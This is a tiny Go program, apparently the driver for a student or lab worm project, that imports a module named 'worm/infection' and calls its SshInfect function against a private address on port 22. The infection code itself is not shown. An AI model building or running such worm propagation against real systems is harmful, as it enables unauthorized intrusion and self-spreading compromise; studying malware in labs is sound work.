package main

import (
	"fmt"

	"github.com/99graciamanel/mlw/worm/infection"
)

func main() {
	message := infection.SshInfect("10.0.2.5:22")
	fmt.Println(message)
}
